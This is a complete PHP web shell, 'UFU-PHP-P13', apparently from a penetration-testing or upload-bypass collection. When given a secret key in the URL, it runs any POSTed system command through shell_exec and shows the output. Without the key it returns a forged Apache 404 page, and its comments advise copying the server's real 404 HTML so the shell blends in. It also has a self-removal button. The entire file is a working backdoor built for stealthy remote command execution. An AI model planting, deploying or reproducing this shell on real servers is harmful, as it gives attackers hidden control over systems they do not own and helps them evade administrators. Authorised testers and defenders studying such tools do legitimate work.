<?php
// Usage: {HOST}/UFU-PHP-P13.php?key=hehe

// The secret key you will use to access the shell via the "?key=" URL parameter.
$secretkey = 'hehe';

// The HTTP status code of the error page which will be returned if an invalid secret key, or no secret key is specified.
$statuscode = 404;

// The error page HTML code which will be displayed if an invalid secret key, or no secret key is specified.
// To blend in with the rest of the application/server, copy the HTML from the 404 page and paste it here.
$errorpagehtml = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at ' . $_SERVER['HTTP_HOST'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address>
</body></html>
';

// Ensure that all GET and POST parameter requirements have been satisfied before displaying the page or executing any shell commands.
if (isset($_POST['execute']) && !empty($_POST['command']) && $_POST['key'] == $secretkey) {
    $command = shell_exec($_POST['command']);
} elseif (isset($_POST['remove'])) {
    unlink(__FILE__);
    exit('Shell removed!');
} elseif ($_GET['key'] != $secretkey) {
    http_response_code($statuscode);
    exit($errorpagehtml);
}
?>

<!DOCTYPE html>
<html>

<head>
    <title>UFU-PHP-P13</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/darkly/bootstrap.min.css">
</head>

<body>
    <div class="container">
        <div class="mt-5 mb-4 row">
            <div class="col-sm-auto my-auto">
                <h1>UFU-PHP-P13</h1>
            </div>
            <div class="col-sm-auto my-auto">
                <form method="POST">
                    <button type="submit" class="btn btn-danger" name="remove" value="Remove">Remove Shell</button>
                </form>
            </div>
        </div>
        <form class="mb-3" method="POST">
            <div class="form-group">
                <label for="command">Command:</label>
                <input type="text" class="form-control mb-3" name="command" id="command"
                    value="<?= htmlspecialchars($_POST['command'], ENT_QUOTES, 'UTF-8') ?>" required autofocus>
                <input type="hidden" name="key" id="key" value="<?= $_GET['key'] ?>" required>
            </div>
            <button type="submit" class="btn btn-primary" name="execute" value="Execute">Execute</button>
        </form>
        <div class="pb-2 mt-5">
            <?php if ($command): ?>
                <pre class="pl-2 pr-2 small"><?= htmlspecialchars($command, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php elseif (!$command && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
                <pre class="pl-2 pr-2 small">No results returned.</pre>
            <?php endif; ?>
        </div>
    </div>
</body>

</html>